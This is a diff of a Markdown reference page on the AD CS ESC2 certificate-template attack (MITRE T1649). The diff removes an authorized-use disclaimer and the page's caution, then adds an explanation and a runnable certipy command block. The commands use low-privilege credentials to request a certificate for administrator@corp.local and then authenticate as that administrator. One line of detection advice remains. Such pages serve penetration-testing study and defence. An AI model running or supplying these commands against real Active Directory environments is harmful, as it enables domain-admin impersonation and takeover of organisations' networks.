@@ -10,21 +10,25 @@ mitre: "T1649"
 tag: null
 ---
 
+
 # AD CS ESC2 (broad certificate purpose)
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **Certificate template** with **Any Purpose EKU** (`2.5.29.37.0`) or no EKU.
 
-## Impact / detection
+### Concept (deep)
+The **Any Purpose EKU** satisfies any service authentication requirement. It is effectively equivalent to ESC1 for impersonation but does **not** require the Client Authentication EKU specifically. The attacker requests a certificate with an arbitrary SAN and authenticates as the target.
+
+### Commands
+```bash
+# Same as ESC1 — the vulnerable template has Any Purpose EKU
+certipy req -u lowpriv@corp.local -p 'Password123!' \
+  -ca CORP-CA -template AnyPurposeTemplate \
+  -upn administrator@corp.local
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
+```
+
+### Impact / detection
 Same as ESC1. **Flag templates with Any Purpose EKU** and remove the EKU or restrict enrolment.
 
 ---
-
-## References
-
-- [Microsoft: Certificate template concepts](https://learn.microsoft.com/windows-server/identity/ad-cs/certificate-template-concepts)
-- [MITRE ATT&CK: T1649](https://attack.mitre.org/techniques/T1649/)
